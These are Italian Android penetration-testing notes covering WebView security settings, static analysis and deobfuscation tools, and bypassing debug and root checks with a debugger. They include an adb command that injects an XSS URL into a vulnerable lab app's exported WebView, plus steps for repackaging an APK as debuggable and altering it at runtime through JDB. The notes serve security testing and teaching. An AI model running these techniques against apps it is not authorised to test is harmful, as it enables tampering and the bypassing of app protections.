JavaScript : disabilitato per impostazione predefinita in WebViews, può essere abilitato tramite setJavaScriptEnabled(). Si consiglia cautela poiché abilitare JavaScript senza adeguate protezioni può introdurre vulnerabilità della sicurezza.

Schema di intenti : WebView può gestire lo intentschema, portando potenzialmente a exploit se non gestiti attentamente. Una vulnerabilità di esempio riguardava un parametro WebView esposto "support_url" che poteva essere sfruttato per eseguire attacchi cross-site scripting (XSS).
> webView.getSettings().setJavaScriptEnabled(true);
Esempio di sfruttamento utilizzando adb:

> adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"






Web View - FileSystem Disabled:
Per impostazione predefinita, WebView consente l'accesso ai file. Questa funzionalità è controllata dal setAllowFileAccess()metodo, disponibile a partire dal livello 3 dell'API Android (Cupcake 1.5). Le applicazioni con l' autorizzazione android.permission.READ_EXTERNAL_STORAGE possono leggere file da una memoria esterna utilizzando uno schema URL di file ( file://path/to/file).

Funzionalità deprecate: accesso universale e ai file da URL
Accesso universale dagli URL dei file : questa funzionalità deprecata consentiva richieste multiorigine dagli URL dei file, ponendo un rischio significativo per la sicurezza a causa di potenziali attacchi XSS. L'impostazione predefinita è disabilitata ( false) per le app destinate ad Android Jelly Bean e versioni successive.

Per verificare questa impostazione, utilizzare getAllowUniversalAccessFromFileURLs().

Per modificare questa impostazione, utilizzare setAllowUniversalAccessFromFileURLs(boolean).

Accesso ai file dagli URL dei file : questa funzionalità, anch'essa deprecata, controllava l'accesso ai contenuti da altri URL di schemi di file. Come l'accesso universale, per impostazione predefinita è disabilitato per una maggiore sicurezza.

Utilizzare getAllowFileAccessFromFileURLs()per controllare e setAllowFileAccessFromFileURLs(boolean)impostare.

Caricamento sicuro dei file
Per disabilitare l'accesso al file system pur continuando ad accedere ad asset e risorse, setAllowFileAccess()viene utilizzato il metodo. Con Android R e versioni successive, l'impostazione predefinita è false.

Controllare con getAllowFileAccess().

Abilitare o disabilitare con setAllowFileAccess(boolean).

WebViewAssetLoader
La classe WebViewAssetLoader rappresenta l'approccio moderno per il caricamento di file locali. Utilizza URL http(s) per accedere ad risorse e risorse locali, in linea con la politica Same-Origin, facilitando così la gestione CORS.

loadUrl
Questa è una funzione comune utilizzata per caricare URL arbitrari in una visualizzazione Web:

> webview.loadUrl("<url here>")
Naturalmente, un potenziale utente malintenzionato non dovrebbe mai essere in grado di controllare l'URL che verrà caricata un'applicazione.





```

```
###. Analisi Automatica:

#. MobSF:
> docker pull opensecurity/mobile-security-framework-mobsf
> docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest


#. Inspeckage:
https://github.com/ac-pm/Inspeckage


#. Yaazhini:
https://www.vegabird.com/yaazhini/ Analisy statica con una GUI


#. Qark:
pip3 install --user qark  # --user is only needed if not using a virtualenv
qark --apk path/to/my.apk
qark --java path/to/parent/java/folder
qark --java path/to/specific/java/file.java


#. ReverseAPK:
> Visualizza tutti i file estratti per una facile consultazione
> Decompila automaticamente i file APK nel formato Java e Smali
> Analizza AndroidManifest.xml per vulnerabilità e comportamenti comuni
> Analisi statica del codice sorgente per vulnerabilità e comportamenti comuni:
  - Informazioni sul dispositivo e altro ancora
> reverse-apk relative/path/to/APP.apk


#. SUPER:
SUPER è un'applicazione da riga di comando che può essere utilizzata in Windows, MacOS X e Linux, che analizza i file .apk alla ricerca di vulnerabilità. Lo fa decomprimendo gli APK e applicando una serie di regole per rilevare tali vulnerabilità.

Tutte le regole sono centrate in un rules.json file e ogni azienda o tester può creare le proprie regole per analizzare ciò di cui ha bisogno.
> super-analyzer {apk_file}



#. StaCoAn
StaCoAn è uno strumento multipiattaforma che aiuta sviluppatori, cacciatori di bugbounty e hacker etici a eseguire analisi statiche del codice su applicazioni mobili.

Il concetto è che trascina e rilascia il file dell'applicazione mobile (un file .apk o .ipa) sull'applicazione StaCoAn e questo genererà un report visivo e portatile per te. Puoi modificare le impostazioni e gli elenchi di parole per ottenere un'esperienza personalizzata.

> ./stacoan






#. AndroBugs:
AndroBugs Framework è un sistema di analisi delle vulnerabilità Android che aiuta gli sviluppatori o gli hacker a trovare potenziali vulnerabilità della sicurezza nelle applicazioni Android.
https://github.com/AndroBugs/AndroBugs_Framework

> python androbugs.py -f [APK file]
> androbugs.exe -f [APK file]





#. Androwarn:
Androwarn è uno strumento il cui scopo principale è rilevare e avvisare l'utente di potenziali comportamenti dannosi sviluppati da un'applicazione Android.

Il rilevamento viene eseguito con l' analisi statica del bytecode Dalvik dell'applicazione, rappresentato come Smali , con la androguardlibreria.

Questo strumento ricerca i comportamenti comuni delle applicazioni "cattive" come: esfiltrazione di identificatori di telefonia, intercettazione di flussi audio/video, modifica di dati PIM, esecuzione di codice arbitrario...

> python androwarn.py -i my_application_to_be_analyzed.apk -r html -v 3




#. MARA:
Usa una serie di tools di analisi: smalisca, ClassyShark, androbugs, androwarn, APKiD
Deoffusca APK tramite apk-deguard.



#. Koodous
Utile per rilevare malware: https://koodous.com/


```



```
###. Deoffuscamento:


#. ProGuard:
ProGuard è distribuito come parte dell'SDK di Android e viene eseguito durante la creazione dell'applicazione in modalità di rilascio.

#. DeGuard:
Deoffuscamento Android. Upload su piattaforma

#. Semplificare
È un deoffuscatore Android generico. Simplify esegue virtualmente un'app per comprenderne il comportamento e quindi tenta di ottimizzare il codice in modo che si comporti in modo identico ma sia più facile da comprendere per un essere umano. Ogni tipo di ottimizzazione è semplice e generico, quindi non importa quale tipo specifico di offuscamento viene utilizzato.

#. APKiD
APKiD ti fornisce informazioni su come è stato creato un APK . Identifica molti compilatori , packer , offuscatori e altre cose strane. È PEiD per Android.

```


```
### Debugging:

Check Manifest - debugging:
android:debuggable=true

Drozer - Check App Debuggable:
run app.package.debuggable 


Contenuti:
https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0

> Decompila l'APK: Utilizza lo strumento APK-GUI per decompilare l'APK.
> Nel file manifest di Android , inserisci android:debuggable=true per abilitare la modalità di debug.
> Ricompilare, firmare e zipallineare l'applicazione modificata.
> Installa l'applicazione modificata: Utilizzare il comando: adb install <application_name>.
> Recupera il nome del pacchetto: "adb shell pm list packages –3" per elencare le applicazioni di terze parti e trovare il nome del pacchetto.

Imposta l'app in attesa della connessione del debugger:
> Comando: adb shell am setup-debug-app –w <package_name>.
Nota: questo comando deve essere eseguito ogni volta prima di avviare l'applicazione per garantire che attenda il debugger.

Per la persistenza, utilizzare:
> adb shell am setup-debug-app –w -–persistent <package_name>.

Per rimuovere tutti i flag, utilizzare:
> adb shell am clear-debug-app <package_name>.

Prepararsi per il debug in Android Studio:
Naviga in Android Studio su File -> Apri profilo o APK .
Apri l'APK ricompilato.
Imposta punti di interruzione nei file Java chiave:

Posizionare i punti di interruzione in MainActivity.java(in particolare nel onCreatemetodo), b.java e ContextWrapper.java.

- Aggirare i controlli:
L'applicazione, in determinati punti, verificherà se è possibile eseguire il debug e controllerà anche i file binari che indicano un dispositivo rooted. Il debugger può essere utilizzato per modificare le informazioni sull'app, annullare l'impostazione del bit debuggabile e modificare i nomi dei file binari cercati per ignorare questi controlli.

Per il controllo debuggabile:
Modifica le impostazioni dei contrassegni:

Nella sezione variabile della console del debugger, vai a: this mLoadedAPK -> mApplicationInfo -> flags = 814267974.

Nota: la rappresentazione binaria di flags = 814267974è 11000011100111011110, che indica che "Flag_debuggable" è attivo.


https://miro.medium.com/v2/resize:fit:1400/1*-ckiSbWGSoc1beuxxpKbow.png
Questi passaggi garantiscono collettivamente che sia possibile eseguire il debug dell'applicazione e che alcuni controlli di sicurezza possano essere aggirati utilizzando il debugger, facilitando un'analisi o una modifica più approfondita del comportamento dell'applicazione.

Il passaggio 2 prevede la modifica del valore di un flag in 814267972, che è rappresentato in formato binario come 110000101101000000100010100.

Sfruttare una vulnerabilità
È stata fornita una dimostrazione utilizzando un'applicazione vulnerabile contenente un pulsante e una visualizzazione di testo. Inizialmente, l'applicazione visualizza "Crack Me". Lo scopo è alterare il messaggio da "Try Again" a "Hacked" in fase di esecuzione, senza modificare il codice sorgente.

Verifica della vulnerabilità
L'applicazione è stata decompilata utilizzando apktoolper accedere al AndroidManifest.xmlfile.

La presenza di android_debuggable="true"in AndroidManifest.xml indica che l'applicazione è debuggabile e suscettibile di sfruttamento.

Vale la pena notare che apktoolviene utilizzato esclusivamente per verificare lo stato debuggabile senza alterare alcun codice.

Preparazione dell'installazione
Il processo prevedeva l'avvio di un emulatore, l'installazione dell'applicazione vulnerabile e l'utilizzo adb jdwpper identificare le porte delle VM Dalvik in ascolto.

Il JDWP (Java Debug Wire Protocol) consente il debug di un'applicazione in esecuzione in una VM esponendo una porta univoca.

Il port forwarding era necessario per il debug remoto, seguito dal collegamento di JDB all'applicazione di destinazione.

Iniezione di codice in fase di esecuzione
Lo sfruttamento è stato effettuato impostando punti di interruzione e controllando il flusso dell'applicazione.

Comandi come classese methods <class_name>sono stati utilizzati per scoprire la struttura dell'applicazione.

È stato impostato un punto di interruzione sul onClickmetodo e la sua esecuzione è stata controllata.

I comandi locals, nexte setsono stati utilizzati per ispezionare e modificare le variabili locali, in particolare cambiando il messaggio "Riprova" in "Hacked".

Il codice modificato è stato eseguito utilizzando il runcomando, alterando con successo l'output dell'applicazione in tempo reale.

Questo esempio ha dimostrato come sia possibile manipolare il comportamento di un'applicazione debuggabile, evidenziando il potenziale per exploit più complessi come ottenere l'accesso alla shell sul dispositivo nel contesto dell'applicazione.

Riferimenti
https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0

https://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications







```


```
Report App - HackerOne:
https://hackerone.com/reports/855618


```

